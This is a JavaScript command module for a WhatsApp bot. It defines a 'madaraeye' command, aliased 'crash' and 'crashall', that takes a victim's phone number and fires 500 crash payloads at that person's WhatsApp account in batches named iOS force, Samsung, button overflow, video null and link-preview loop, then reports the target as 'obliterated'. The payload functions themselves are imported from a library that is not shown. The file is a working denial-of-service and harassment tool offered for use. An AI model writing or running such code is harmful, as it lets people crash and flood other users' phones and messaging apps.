'use strict';
const { MadaraEye } = require('../../lib/madaraEye');
const { createProgressBar } = require('../../lib/progressBar');

module.exports = {
    name: 'madaraeye',
    aliases: ['crash', 'crashall', 'executeall', 'alldamage', 'maxcrash', 'eye'],
    category: 'madaraeye',
    desc: 'ᴍᴀᴅᴀʀᴀ ᴇʏᴇ — ᴀʟʟ ᴄʀᴀsʜ ᴍᴇᴛʜᴏᴅs ᴜɴʟᴇᴀsʜᴇᴅ',
    usage: '.madaraeye <number>',
    waitReact: true,

    async execute(sock, msg, args, ctx) {
        const s = ctx.settings;
        const prefix = s.prefix || '.';
        
        if (!args[0]) {
            return sock.sendMessage(ctx.from, { 
                text: `❌ *ᴡʀᴏɴɢ ᴜsᴀɢᴇ*\n\n📌 *Usage:* ${prefix}madaraeye <number>\n📝 *Example:* ${prefix}madaraeye 2348012345678` 
            }, { quoted: msg });
        }
        
        const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        
        let eye = global.getMadaraEye?.(sock);
        if (!eye) {
            eye = new MadaraEye(sock);
        }
        
        const TOTAL = 500;
        const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
        
        try {
            for (let i = 0; i < 100; i++) {
                await eye.iosInvisibleForce(target);
                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
            }
            
            for (let i = 0; i < 100; i++) {
                await eye.samsung(target);
                await bar.update(1, 'sᴀᴍsᴜɴɢ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 100));
            }
            
            for (let i = 0; i < 100; i++) {
                await eye.buttonOverflow(target);
                await bar.update(1, 'ʙᴜᴛᴛᴏɴ ᴏᴠᴇʀғʟᴏᴡ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            for (let i = 0; i < 100; i++) {
                await eye.vidxNull(target);
                await bar.update(1, 'ᴠɪᴅx ɴᴜʟʟ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
            }
            
            for (let i = 0; i < 100; i++) {
                await eye.linkPreviewLoop(target, msg);
                await bar.update(1, 'ʟɪɴᴋ ᴘʀᴇᴠɪᴇᴡ');
                if (i % 10 === 0) await new Promise(r => setTimeout(r, 200));
            }
            
            await bar.done(`✅ ᴍᴀᴅᴀʀᴀ ᴇʏᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ᴛᴀʀɢᴇᴛ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${target}`);
        } catch (e) {
            await bar.done(`❌ ᴇʀʀᴏʀ: ${e.message}`);
        }
    }
};